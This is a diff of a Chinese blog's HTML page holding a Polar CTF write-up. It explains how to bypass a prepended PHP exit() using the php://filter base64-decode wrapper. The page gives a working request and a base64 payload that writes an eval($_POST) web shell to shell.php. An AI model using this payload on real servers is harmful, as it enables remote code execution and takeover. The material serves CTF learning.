@@ -40,8 +40,12 @@
 <meta property="og:description" content="polar  写shell  file_put_contents  函数  会把**&lt;?php exit();”.$_POST[‘content’]** 存入到 $_GET[‘filename’] 文件里 但是这里的&lt;?php exit();          执行时就会直接先执行exit()退出了  导致我们后面的代码无法执行 这里就需要绕过一下exit();    这里是 php死">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://csd0617.github.io/picture/image-20250401193750422.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250401200553997.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250401200829019.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250401200941728.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250401201000257.png">
 <meta property="article:published_time" content="2025-04-01T12:19:00.000Z">
-<meta property="article:modified_time" content="2025-04-01T12:27:06.760Z">
+<meta property="article:modified_time" content="2025-04-01T13:12:56.901Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250401193750422.png">
@@ -333,46 +337,34 @@
 
 <p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
 <p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
-<?php exit();a 就会被base64解密从而乱码，这样就不会被当成PHP代码执行了。
+<p>&lt;?php exit();a 就会被base64解密从而乱码，这样就不会被当成PHP代码执行了。</p>
+<p>&lt;?  空格  ;  为什么不算呢？</p>
+<p><strong>Base64 解码时，符号的处理方式</strong></p>
+<p>在 PHP 中，<code>base64_decode()</code> 只处理 <strong>Base64 允许的字符</strong>，即：</p>
+<ul>
+<li><code>A-Z</code></li>
+<li><code>a-z</code></li>
+<li><code>0-9</code></li>
+<li><code>+</code> 和 <code>/</code></li>
+<li><code>=</code>（填充符）</li>
+</ul>
+<p><strong>任何不在这个范围内的符号</strong>（例如空格、<code>&lt;</code>, <code>?</code>, <code>;</code>）：</p>
+<ul>
+<li>如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 <code>false</code>（如果 <code>strict</code> 参数为 <code>true</code>）。</li>
+<li>但 <code>base64_decode()</code> <strong>不会把它们当作特殊字符处理</strong>，它只是单纯地按照 Base64 规则解析。</li>
+</ul>
+<p>所以base解码并不会识别&lt;?  空格  ;  也就是只有七个字节需要加一个字节来凑一下</p>
+<p>ok   回到这道题</p>
+<p>这里我们直接利用php:&#x2F;&#x2F;filter 伪协议  对其进行base64解码  来写入shell</p>
+<p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>post:  content&#x3D;aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</p>
+<p><img src="/../picture/image-20250401200553997.png" alt="image-20250401200553997"></p>
+<p><img src="/../picture/image-20250401200829019.png" alt="image-20250401200829019"></p>
+<p>这里访问shell.php  发现也就执行成功了   �^�+Z就是前面&lt;?php exit();a  解码成的乱码</p>
+<p>然后再利用写入的shell解题</p>
+<p><img src="/../picture/image-20250401200941728.png" alt="image-20250401200941728"></p>
+<p><img src="/../picture/image-20250401201000257.png" alt="image-20250401201000257"></p>
 
-<?  空格  ;  为什么不算呢？
-
-**Base64 解码时，符号的处理方式**
-
-在 PHP 中，`base64_decode()` 只处理 **Base64 允许的字符**，即：
-
-- `A-Z`
-- `a-z`
-- `0-9`
-- `+` 和 `/`
-- `=`（填充符）
-
-**任何不在这个范围内的符号**（例如空格、`<`, `?`, `;`）：
-
-- 如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 `false`（如果 `strict` 参数为 `true`）。
-- 但 `base64_decode()` **不会把它们当作特殊字符处理**，它只是单纯地按照 Base64 规则解析。
-
-所以base解码并不会识别<?  空格  ;  也就是只有七个字节需要加一个字节来凑一下
-
-ok   回到这道题
-
-这里我们直接利用php://filter 伪协议  对其进行base64解码  来写入shell
-
-?filename=php://filter/read/convert.base64-decode/resource=shell.php
-
-post:  content=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+
-
-![image-20250401200553997](../picture/image-20250401200553997.png)
-
-![image-20250401200829019](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250401200829019.png)
-
-这里访问shell.php  发现也就执行成功了   �^�+Z就是前面<?php exit();a  解码成的乱码
-
-然后再利用写入的shell解题
-
-![image-20250401200941728](../picture/image-20250401200941728.png)
-
-![image-20250401201000257](../picture/image-20250401201000257.png)
       
     </div>
     <footer class="article-footer">
@@ -453,10 +445,10 @@ post:  content=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+
     
       <div>
         <span class="icon-brush"></span>
-        14.5k
+        14.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        00:57
+        00:58
       </div>
     
     
@@ -642,7 +634,7 @@ post:  content=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+
           description: "",
           stripContent: "polar  写shell  file_put_contents  函数  会把**&amp;lt;?php exit();”.$_POST[‘content’]** 存入到 $_GET[‘filename’] 文件里 但是这里的&amp;lt;?php exit();          执行时就会直接先执行exit()退出了  导致我们后面的代码无法执行 这里就需要绕过一下exit();    这里是 php死亡exit()绕过 1file_put_contents($filename,&amp;quot;&amp;lt;?",
           date: "Tue Apr 01 2025 20:19:00 GMT+0800",
-          updated: "Tue Apr 01 2025 20:27:06 GMT+0800",
+          updated: "Tue Apr 01 2025 21:12:56 GMT+0800",
           cover: "/../covers/5.jpg",
         };
       </script>
